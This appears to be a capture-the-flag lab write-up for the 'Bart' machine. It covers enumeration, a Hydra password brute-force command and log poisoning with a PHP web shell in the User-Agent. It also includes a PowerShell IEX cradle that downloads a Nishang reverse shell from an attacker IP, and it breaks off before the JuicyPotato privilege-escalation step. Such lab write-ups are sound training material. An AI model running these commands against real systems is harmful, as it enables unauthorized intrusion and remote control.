@@ -1,0 +1,74 @@
+Run Simple Nmap command
+
+Nmap -P -A {target} -> result gives port 80 is open with Microsoft IIS httpd 10.0
+
+Nmap result gives a redirection to http://fourm.bart.htb/
+
+There is no useful information we can get from Microsoft IIS httpd 10.0
+
+So moving on to http://fourm.bart.htb (add this in host file) open in browser
+
+I have performed gobuster and fuff scan and no output is given
+
+Now goto Burpsuite proxy 
+
+In Burp, visit Proxy > Options > Proxy Listeners > Add. In the Binding tab, set the Bind port to 8081 and and in the Request Handling tab, set the Redirect to host option to bart.htb and the Redirect to Port option to 80. Make sure to select the newly added listener once you’re done.
+
+As now we check gobuster checking random directory string
+
+http://localhost:8081/2843d61b-7b2c-4d86-9dae-6909aebeba42 it gives 200 response
+
+So now we need to ignore 200 reponses and check other responses. Use below go buster command
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bart.htb
+
+we got the result /forum /monitor /Fourm , now bart.htb/monitor redirects to monitor.bart.htb, so add this too in hosts file
+
+Now in monitor.bart.htb we can see login page with forgot password option, enter the "harvey" got from the source code and
+alert message confirms user exists and an email is sent for password is recovery
+
+User "harvey:potter" credents to login, which we got from the html comments from source code
+
+Now after login, we can see url http://internal-01.bart.htb/, it redirects to http://internal-01.bart.htb/simple_chat/login_form.php
+
+Hydra command
+
+hydra -l harvey -P /usr/share/metasploit-framework/data/wordlists/common_roots.txt internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=login:Password"
+
+Hydra gives us the result - harvey:Password1, lets use in in /simple_chat/login.php
+
+In viewsource: we can find a link that sends GET request to access the logs
+
+http://internal-01.bart.htb/log/log.txt?filename=log.php&username=harvey
+
+This simply responds with the logged useragent. Intercept request in burp
+Add a php shell in place of user-agent as below
+
+User-Agent:<?php system($_REQUEST['cmd']) ?> Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+
+Now the upcoming steps are a bit complicated. 
+
+We need to invoke powershell via log poisoning and transfer Nishang shell.ps1 
+
+1. goto the shell.ps1 directory, initiate python http server
+2. Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.90:5555/shell1.ps1')"
+
+5555 -> port from Python download server, shell.ps1 should be modified at the lastline
+
+Run the command from step 2 in the burp-request parameter "cmd"
+
+3. Check with netcat listner at 9001 port (as mentioned in shell.ps1)
+
+Now we got the shell.
+
+type systeminfo to get information about the system -> system is Windows 10 Pro 64 bit
+
+Now we can check the current user previlages using "whoami /priv" command
+
+we can see below previlages enabled. so it is possible to exploit with Juicy potato
+
+SeImpersonatePrivilege  Impersonate a client after authentication Enabled
+
+Transfer JuicyPotato from Kali to target using below command & Python FTP
+
+
